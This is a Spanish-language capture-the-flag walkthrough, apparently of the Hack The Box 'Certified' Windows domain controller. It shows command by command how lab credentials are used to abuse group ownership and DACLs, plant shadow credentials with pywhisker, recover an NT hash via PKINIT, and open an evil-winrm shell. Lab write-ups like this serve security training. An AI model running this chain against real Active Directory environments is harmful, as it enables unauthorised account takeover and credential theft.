Bueno maquina windows

---

## Nmap Summary
| Port | Software    | Version                                 | Status  |
| ---- | ----------- | --------------------------------------- | ------- |
| 53   | domain      | Simple DNS                              | open    |
| 80   | http        | Apache http 2.4.29                      | open    |
| 139  | netbios-sec | Microsfot Windows netbios-ssn           | open    |
| 389  | ldap        | Microsoft Windows Active Directory LDAP | open    |




Usamos Netexex para sacar los datos para Bloodhound

```bash
nxc ldap dc01.certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-tcp --dns-server 10.10.11.41

SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.41     389    DC01             [+] certified.htb\judith.mader:judith09 
LDAP        10.10.11.41     389    DC01             Resolved collection methods: localadmin, objectprops, acl, dcom, container, trusts, psremote, group, rdp, session
LDAP        10.10.11.41     389    DC01             Done in 00M 11S
LDAP        10.10.11.41     389    DC01             Compressing output into /home/cher0/.nxc/logs/DC01_10.10.11.41_2025-01-28_002747_bloodhound.zip

```



# BLOODHOUND


1. **Judith Mader's Permissions**:
2. Judith Mader has **WriteOwner** permissions on the Management group.
3. **Service Account (Management_SVC)**:
4. The Management_SVC account has **GenericWrite** permissions over the Management group.
5. **CA_Operator Privilege**:
6. The Management_SVC account has **GenericAll** permissions over the CA_Operator user.





#### 1. Data Collection with nxc





Usamos BloodyAD 
https://github.com/CravateRouge/bloodyAD.git

Se usa bloodyAd para hacer  a judith owner del Grupo Management!
```bash
bloodyAD --host "$IP" -d "certified.htb" -u "judith.mader" -p "judith09" set owner Management judith.mader
```


### Dacledit (impacket)

Modificamos los permisos del grupo con dacledit

```bash
└─# python3 dacledit.py -action 'write' -rights 'WriteMembers' -principal 'judith.mader' -target-dn 'CN=MANAGEMENT,N  Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250128-100158.bak
[*] DACL modified successfully!

```

Metemos a judith en Management
```bash
python3 bloodyAD.py --host $IP -d 'certified.htb' -u 'judith.mader' -p 'judith09' add groupMember "Management" "judith.mader"
[+] judith.mader added to Management

```

##### 5. Exploiting KeyCredentialLink

```
python3 pywhisker/pywhisker.py -d "certified.htb" -u "judith.mader" -p judith09 --target "management_svc" --action add 
[*] Searching for the target account
[*] Target user found: CN=management service,CN=Users,DC=certified,DC=htb
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID: 3245a0ff-4c14-b1c4-dd73-e1caabc9d6f0
[*] Updating the msDS-KeyCredentialLink attribute of management_svc
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[+] Saved PFX (#PKCS12) certificate & key at path: 2edmEK5f.pfx
[*] Must be used with password: FE2RL7C3C8FT44c3EV9H
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools

```

PKINITtools
Usamos PKINIT para obtener el ticket (TGT)
```bash
 python3 gettgtpkinit.py certified.htb/management_svc -cert-pfx /home/cher0/HTB/Certified/pywhisker/2edmEK5f.pfx  -pfx-pass FE2RL7C3C8FT44c3EV9H pwn.ccache
2025-01-28 17:13:54,588 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-28 17:13:54,606 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-01-28 17:14:06,825 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-01-28 17:14:06,825 minikerberos INFO     fbd1f3ce1b49bf35543ab5c200f2fad1681cd7be4efd566bbc694b18181000cc
INFO:minikerberos:fbd1f3ce1b49bf35543ab5c200f2fad1681cd7be4efd566bbc694b18181000cc
2025-01-28 17:14:06,828 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Ahora usamos gethash para solicitar el NThash con el ccache

Para usar la herramienta debemos establecer la variable KRB5CCNAME al archivo ccache que nos proporciono gettgtpkinit:
```bash
export KRB5CCNAME=pwn.ccache    
➜  PKINITtools git:(master) python3 getnthash.py certified.htb/management_svc -key fbd1f3ce1b49bf35543ab5c200f2fad1681cd7be4efd566bbc694b18181000cc                                   
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
a091c1832bcdd4677c28b5a6a1295584

```

Una vez obtenido el hash podemos loguearnos con evil-winrm
```bash
 evil-winrm -i $IP -H a091c1832bcdd4677c28b5a6a1295584 -u management_svc
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                                                                                                     
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\management_svc\Documents> 

```

---

